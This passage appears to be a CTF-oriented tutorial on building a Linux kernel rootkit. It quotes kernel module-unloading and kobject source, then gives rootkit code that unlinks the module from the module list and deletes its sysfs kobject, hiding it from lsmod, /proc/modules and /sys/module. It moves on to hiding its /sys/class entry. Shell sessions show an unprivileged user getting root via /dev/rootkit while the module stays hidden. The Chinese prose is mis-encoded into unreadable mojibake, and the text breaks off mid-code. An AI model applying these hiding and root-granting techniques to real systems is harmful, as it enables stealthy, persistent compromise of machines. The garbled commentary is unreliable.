<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(delete_module, <span class="keyword">const</span> <span class="keyword">char</span> __user *, name_user,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">mod</span>;</span></span><br><span class="line">	<span class="keyword">char</span> name[MODULE_NAME_LEN];</span><br><span class="line">	<span class="keyword">char</span> buf[MODULE_FLAGS_BUF_SIZE];</span><br><span class="line">	<span class="keyword">int</span> ret, forced = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!capable(CAP_SYS_MODULE) || modules_disabled)</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strncpy_from_user(name, name_user, MODULE_NAME_LEN<span class="number">-1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	name[MODULE_NAME_LEN<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	audit_log_kern_module(name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mutex_lock_interruptible(&amp;module_mutex) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">	mod = find_module(name);</span><br><span class="line">	<span class="keyword">if</span> (!mod) &#123;</span><br><span class="line">		ret = -ENOENT;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!list_empty(&amp;mod-&gt;source_list)) &#123;</span><br><span class="line">		<span class="comment">/* Other modules depend on us: get rid of them first. */</span></span><br><span class="line">		ret = -EWOULDBLOCK;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Doing init or already dying? */</span></span><br><span class="line">	<span class="keyword">if</span> (mod-&gt;state != MODULE_STATE_LIVE) &#123;</span><br><span class="line">		<span class="comment">/* <span class="doctag">FIXME:</span> if (force), slam module count damn the torpedoes */</span></span><br><span class="line">		pr_debug(<span class="string">&quot;%s already dying\n&quot;</span>, mod-&gt;name);</span><br><span class="line">		ret = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If it has an init func, it must have an exit func to unload */</span></span><br><span class="line">	<span class="keyword">if</span> (mod-&gt;init &amp;&amp; !mod-&gt;<span class="built_in">exit</span>) &#123;</span><br><span class="line">		forced = try_force_unload(flags);</span><br><span class="line">		<span class="keyword">if</span> (!forced) &#123;</span><br><span class="line">			<span class="comment">/* This module can&#x27;t be removed */</span></span><br><span class="line">			ret = -EBUSY;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = try_stop_module(mod, flags, &amp;forced);</span><br><span class="line">	<span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	mutex_unlock(&amp;module_mutex);</span><br><span class="line">	<span class="comment">/* Final destruction now no one is using it. */</span></span><br><span class="line">	<span class="keyword">if</span> (mod-&gt;<span class="built_in">exit</span> != <span class="literal">NULL</span>)</span><br><span class="line">		mod-&gt;<span class="built_in">exit</span>();</span><br><span class="line">	blocking_notifier_call_chain(&amp;module_notify_list,</span><br><span class="line">				     MODULE_STATE_GOING, mod);</span><br><span class="line">	klp_module_going(mod);</span><br><span class="line">	ftrace_release_mod(mod);</span><br><span class="line"></span><br><span class="line">	async_synchronize_full();</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Store the name and taints of the last unloaded module for diagnostic purposes */</span></span><br><span class="line">	strscpy(last_unloaded_module.name, mod-&gt;name, <span class="keyword">sizeof</span>(last_unloaded_module.name));</span><br><span class="line">	strscpy(last_unloaded_module.taints, module_flags(mod, buf, <span class="literal">false</span>), <span class="keyword">sizeof</span>(last_unloaded_module.taints));</span><br><span class="line"></span><br><span class="line">	free_module(mod);</span><br><span class="line">	<span class="comment">/* someone could wait for the module in add_unformed_module() */</span></span><br><span class="line">	wake_up_all(&amp;module_wq);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">	mutex_unlock(&amp;module_mutex);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°ä»£ç æ˜¯<code>rmmod</code>èƒŒåè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨<code>delete_module</code>çš„å†…éƒ¨å®ç°ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_module</span><span class="params">(struct <span class="keyword">module</span> *mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	trace_module_free(mod);</span><br><span class="line"></span><br><span class="line">	mod_sysfs_teardown(mod);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We leave it in list to prevent duplicate loads, but make sure</span></span><br><span class="line"><span class="comment">	 * that noone uses it while it&#x27;s being deconstructed.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	mutex_lock(&amp;module_mutex);</span><br><span class="line">	mod-&gt;state = MODULE_STATE_UNFORMED;</span><br><span class="line">	mutex_unlock(&amp;module_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Arch-specific cleanup. */</span></span><br><span class="line">	module_arch_cleanup(mod);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Module unload stuff */</span></span><br><span class="line">	module_unload_free(mod);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Free any allocated parameters. */</span></span><br><span class="line">	destroy_params(mod-&gt;kp, mod-&gt;num_kp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (is_livepatch_module(mod))</span><br><span class="line">		free_module_elf(mod);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now we can delete it from the lists */</span></span><br><span class="line">	mutex_lock(&amp;module_mutex);</span><br><span class="line">	<span class="comment">/* Unlink carefully: kallsyms could be walking list. */</span></span><br><span class="line">	list_del_rcu(&amp;mod-&gt;<span class="built_in">list</span>);</span><br><span class="line">	mod_tree_remove(mod);</span><br><span class="line">	<span class="comment">/* Remove this module from bug list, this uses list_del_rcu */</span></span><br><span class="line">	module_bug_cleanup(mod);</span><br><span class="line">	<span class="comment">/* Wait for RCU-sched synchronizing before releasing mod-&gt;list and buglist. */</span></span><br><span class="line">	synchronize_rcu();</span><br><span class="line">	<span class="keyword">if</span> (try_add_tainted_module(mod))</span><br><span class="line">		pr_err(<span class="string">&quot;%s: adding tainted module to the unloaded tainted modules list failed.\n&quot;</span>,</span><br><span class="line">		       mod-&gt;name);</span><br><span class="line">	mutex_unlock(&amp;module_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This may be empty, but that&#x27;s OK */</span></span><br><span class="line">	module_arch_freeing_init(mod);</span><br><span class="line">	kfree(mod-&gt;args);</span><br><span class="line">	percpu_modfree(mod);</span><br><span class="line"></span><br><span class="line">	free_mod_mem(mod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä½¿ç”¨çš„æ˜¯<code>list_del_rcu</code>å‡½æ•°ç›´æ¥å¯¹å…¶è¿›è¡Œè„±é“¾æ“ä½œï¼Œå°½ç®¡å…¶æ˜¯rcuå®‰å…¨çš„åœ¨å‰åä¹Ÿéƒ½æ˜¯åŠ äº†é”ä¿å¹³å®‰çš„ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨å®ç°è„±é“¾æ“ä½œæ—¶ä¹Ÿéœ€è¦è¿›è¡Œç›¸åº”çš„åŠ é”æ“ä½œã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span> =</span> (&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line">    mutex_lock(&amp;module_mutex);</span><br><span class="line">    <span class="built_in">list</span>-&gt;prev-&gt;next = <span class="built_in">list</span>-&gt;next;</span><br><span class="line">    <span class="built_in">list</span>-&gt;next-&gt;prev = <span class="built_in">list</span>-&gt;prev;</span><br><span class="line">    mutex_unlock(&amp;module_mutex);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåœ¨initæ—¶åšä¸€ä¸‹æ“ä½œå³å¯å®ç°è„±é“¾æ“ä½œã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ lsmod </span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># lsmod </span></span><br><span class="line">~ <span class="comment"># cat /proc/modules | grep &#x27;rootkit&#x27;</span></span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>å‘ç°æ— è®ºæ˜¯<code>lsmod</code>è¿˜æ˜¯ç›´æ¥æŸ¥çœ‹<code>/proc/modules</code>æ–‡ä»¶éƒ½æ— æ³•æŸ¥çœ‹åˆ°<code>rootkit</code>ç›¸å…³ä¿¡æ¯äº†ï¼Œä½†æ˜¯ä¾æ—§ä¸ä¼šå½±å“æˆ‘ä»¬ææƒæ“ä½œã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„<code>delete_module</code>ç³»ç»Ÿè°ƒç”¨ä¸­æåˆ°åœ¨æ­£å¸¸å¸è½½ä¸€ä¸ªæ¨¡å—æ—¶æ˜¯éœ€è¦è„±é“¾æ“ä½œçš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ¨¡å—æ— æ³•å°†å…¶å¸è½½äº†ã€‚</strong></p>
<h3 id="sys-module-ä¿¡æ¯éšè—"><a href="#sys-module-ä¿¡æ¯éšè—" class="headerlink" title="/sys/module/ä¿¡æ¯éšè—"></a>/sys/module/ä¿¡æ¯éšè—</h3><p>sysfsä¸procfsç›¸ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯ä¸€ä¸ªåŸºäºRAMçš„è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†å†…æ ¸ä¿¡æ¯ä»¥æ–‡ä»¶çš„æ–¹å¼æä¾›ç»™ç”¨æˆ·ç¨‹åºä½¿ç”¨ï¼Œå…¶ä¸­ä¾¿åŒ…æ‹¬æˆ‘ä»¬çš„ rootkit æ¨¡å—ä¿¡æ¯ï¼Œsysfs ä¼šåŠ¨æ€è¯»å–å†…æ ¸ä¸­çš„ kobject å±‚æ¬¡ç»“æ„å¹¶åœ¨ <code>/sys/module/</code> ç›®å½•ä¸‹ç”Ÿæˆæ–‡ä»¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/module/</span><br><span class="line">8250                intel_idle          shpchp</span><br><span class="line">acpi                intel_pmc_core      slab_common</span><br><span class="line">acpi_cpufreq        ipv6                spurious</span><br><span class="line">acpiphp             kdb                 sr_mod</span><br><span class="line">apparmor            kernel              srcutree</span><br><span class="line">ata_generic         keyboard            <span class="built_in">suspend</span></span><br><span class="line">ata_piix            kgdb_nmi            sysrq</span><br><span class="line">battery             kgdboc              tcp_cubic</span><br><span class="line">blk_cgroup          libata              thermal</span><br><span class="line">blk_crypto          libnvdimm           tpm</span><br><span class="line">block               loop                tpm_crb</span><br><span class="line">button              md_mod              tpm_tis</span><br><span class="line">configfs            module              tpm_tis_core</span><br><span class="line">cpufreq             mousedev            uhci_hcd</span><br><span class="line">cpuidle             netpoll             usbcore</span><br><span class="line">crc_t10dif          nmi_backtrace       uv_nmi</span><br><span class="line">cryptomgr           page_alloc          vfio</span><br><span class="line">debug_core          pata_sis            vfio_iommu_type1</span><br><span class="line">device_hmem         pcc_cpufreq         vfio_pci</span><br><span class="line">dm_mod              pci_hotplug         vfio_virqfd</span><br><span class="line">dns_resolver        pcie_aspm           virtio_mmio</span><br><span class="line">dynamic_debug       pciehp              virtio_pci</span><br><span class="line">edac_core           ppp_generic         virtual_root</span><br><span class="line">edd                 printk              vt</span><br><span class="line">efivars             processor           watchdog</span><br><span class="line">ehci_hcd            pstore              workqueue</span><br><span class="line">eisa_bus            random              xen</span><br><span class="line">fb                  rcupdate            xen_acpi_processor</span><br><span class="line">firmware_class      rcutree             xen_blkfront</span><br><span class="line">fscrypto            rfkill              xen_netfront</span><br><span class="line">fuse                rng_core            xhci_hcd</span><br><span class="line">gpiolib_acpi        rootkit             xz_dec</span><br><span class="line">haltpoll            rtc_cmos            zswap</span><br><span class="line">i8042               scsi_mod</span><br><span class="line">ima                 sg</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure>

<p>Kobject æ˜¯ Linux ä¸­çš„è®¾å¤‡æ•°æ®ç»“æ„åŸºç±»ï¼Œåœ¨å†…æ ¸ä¸­ä¸º <code>struct kobject</code> ç»“æ„ä½“ï¼Œé€šå¸¸å†…åµŒåœ¨å…¶ä»–æ•°æ®ç»“æ„ä¸­ï¼›æ¯ä¸ªè®¾å¤‡éƒ½æœ‰ä¸€ä¸ª kobject ç»“æ„ä½“ï¼Œå¤šä¸ª kobject é—´é€šè¿‡å†…æ ¸åŒå‘é“¾è¡¨è¿›è¡Œé“¾æ¥ï¼›kobject ä¹‹é—´æ„æˆå±‚æ¬¡ç»“æ„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> &#123;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>		*name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">entry</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span>		*<span class="title">parent</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span>		*<span class="title">kset</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span>	*<span class="title">ktype</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kernfs_node</span>	*<span class="title">sd</span>;</span> <span class="comment">/* sysfs directory entry */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span>		<span class="title">kref</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> state_initialized:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> state_in_sysfs:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> state_add_uevent_sent:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> state_remove_uevent_sent:<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> uevent_suppress:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_KOBJECT_RELEASE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span>	<span class="title">release</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°çš„æ˜¯åŒæ ·æ˜¯å­˜åœ¨ä¸€ä¸ªæˆå‘˜<code>entry</code>æ˜¯<code>list_head</code>ç»“æ„çš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __kobject_del(struct kobject *kobj)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kernfs_node</span> *<span class="title">sd</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span> *<span class="title">ktype</span>;</span></span><br><span class="line"></span><br><span class="line">	sd = kobj-&gt;sd;</span><br><span class="line">	ktype = get_ktype(kobj);</span><br><span class="line"></span><br><span class="line">	sysfs_remove_groups(kobj, ktype-&gt;default_groups);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send &quot;remove&quot; if the caller did not do it but sent &quot;add&quot; */</span></span><br><span class="line">	<span class="keyword">if</span> (kobj-&gt;state_add_uevent_sent &amp;&amp; !kobj-&gt;state_remove_uevent_sent) &#123;</span><br><span class="line">		pr_debug(<span class="string">&quot;&#x27;%s&#x27; (%p): auto cleanup &#x27;remove&#x27; event\n&quot;</span>,</span><br><span class="line">			 kobject_name(kobj), kobj);</span><br><span class="line">		kobject_uevent(kobj, KOBJ_REMOVE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sysfs_remove_dir(kobj);</span><br><span class="line">	sysfs_put(sd);</span><br><span class="line"></span><br><span class="line">	kobj-&gt;state_in_sysfs = <span class="number">0</span>;</span><br><span class="line">	kobj_kset_leave(kobj);</span><br><span class="line">	kobj-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kobject_del</span><span class="params">(struct kobject *kobj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">parent</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!kobj)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	parent = kobj-&gt;parent;</span><br><span class="line">	__kobject_del(kobj);</span><br><span class="line">	kobject_put(parent);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kobject_del);</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶å½¢å¼åŒå‰é¢ä¸€è‡´ï¼Œä¸è¿‡è¿™æ˜¯å´æ˜¯ç›´æ¥åœ¨<code>__kobject_del</code>å‡½æ•°ä¸­ä½¿ç”¨äº†<code>sysfs_remove_dir</code>æ¥åˆ é™¤æ–‡ä»¶å¤¹ï¼Œå…¶å†…éƒ¨å®ç°å°±æ˜¯åˆ é™¤æ‰å½“å‰<code>kobject</code>ç»“æ„ä½“çš„sdæŒ‡é’ˆï¼ˆå³super blockï¼‰ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;__this_module.mkobj.kobj);</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ä¸Šé¢çš„å«ä¹‰æ¥è¯´æˆ‘ä»¬åªéœ€è°ƒç”¨è¿™ä¸€ä¸ª<code>kobject_del</code>å‡½æ•°å³å¯å®ç°<code>/sys/module/</code>ä¿¡æ¯éšè—äº†ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/module/ | grep rootfs</span><br><span class="line">~ $ lsmod</span><br><span class="line">~ $ cat /proc/modules | grep rookit</span><br><span class="line">~ $ ls /sys/module/ | grep rootkit</span><br><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h3 id="sys-class-ä¿¡æ¯éšè—"><a href="#sys-class-ä¿¡æ¯éšè—" class="headerlink" title="/sys/class/ä¿¡æ¯éšè—"></a>/sys/class/ä¿¡æ¯éšè—</h3><p>æˆ‘ä»¬åœ¨åˆ›å»º <code>/dev/</code> è®¾å¤‡æ–‡ä»¶æ¥å£æ—¶åˆ›å»ºäº†ä¸€ä¸ª classï¼Œè€Œè¿™å¯ä»¥è¢«åœ¨ <code>/sys/class</code> ç›®å½•ä¸‹å‘ç°ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦å®Œæˆå¯¹ class çš„éšè—ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/class/</span><br><span class="line">ata_device     dma_heap       mdio_bus       ptp            spi_slave</span><br><span class="line">ata_link       dmi            mem            pwm            thermal</span><br><span class="line">ata_port       extcon         misc           rapidio_port   tpm</span><br><span class="line">backlight      firmware       mmc_host       regulator      tpmrm</span><br><span class="line">bdi            gpio           nd             remoteproc     tty</span><br><span class="line">block          graphics       net            rfkill         usb_role</span><br><span class="line">bsg            hwmon          pci_bus        rootkit_class  vc</span><br><span class="line">dax            i2c-adapter    pci_epc        rtc            vfio</span><br><span class="line">devcoredump    i2c-dev        phy            scsi_device    virtio-ports</span><br><span class="line">devfreq        input          power_supply   scsi_disk      vtconsole</span><br><span class="line">devfreq-event  intel_scu_ipc  powercap       scsi_generic   wakeup</span><br><span class="line">devlink        iommu          ppp            scsi_host      watchdog</span><br><span class="line">dma            leds           pps            spi_master</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kset_unregister</span><span class="params">(struct kset *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!k)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	kobject_del(&amp;k-&gt;kobj);</span><br><span class="line">	kobject_put(&amp;k-&gt;kobj);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kset_unregister);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">class_unregister</span><span class="params">(struct class *cls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pr_debug(<span class="string">&quot;device class &#x27;%s&#x27;: unregistering\n&quot;</span>, cls-&gt;name);</span><br><span class="line">	class_remove_groups(cls, cls-&gt;class_groups);</span><br><span class="line">	kset_unregister(&amp;cls-&gt;p-&gt;subsys);</span><br><span class="line">&#125;</span><br><span 